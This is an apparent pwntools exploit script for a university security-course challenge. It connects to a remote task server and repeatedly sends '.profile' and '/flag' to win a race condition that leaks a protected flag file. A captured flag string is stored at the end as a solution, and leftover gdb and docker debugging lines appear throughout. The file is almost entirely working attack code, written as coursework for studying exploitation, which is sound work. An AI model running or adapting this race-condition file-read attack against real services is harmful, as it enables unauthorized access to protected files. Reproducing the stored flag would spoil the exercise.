from pwn import *
import string
from sys import argv
import os
import time
import sys
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file /gdbscript/vuln
b *register_to_exam+137
b *secret
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
#p = remote('tasks.ws24.softsec.rub.de', 33251)

host = "127.0.0.1"
port = 1024
host = "tasks.ws24.softsec.rub.de"
port = 33266


p=remote(host, port)
#p2=process('tmux split-window -h docker exec -ti "$(docker ps -q -f \'ancestor=softsec/debug/practice-5\')" /bin/bash -c \'gdb -x /gdbscript/gdbscript -p "$(pgrep -n vuln)"\'', shell=True)
#sleep(2)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)


def attack():
    for j in range(20):
        try:
            stallings = []
            races = []
            p = remote(host, port)

            for z in range(100):
                p.send(b".profile\n")
                p.send(b"/flag\n")
            sleep(1)

            try:
                resp = p.recv()
                if b"softsec{" in resp:
                    index = resp.find(b"softsec{")
                    print(resp[index:index+73])
                    return
                else:
                    print(resp)
            except: pass
            p.close()
        except: pass

attack()

p.interactive()

#softsec{tG-8-DThh86DnNPnnowky5eS4W3-d3khCs-jcAJxDpygzgrAAFi9Xl0GvWVlC7bl}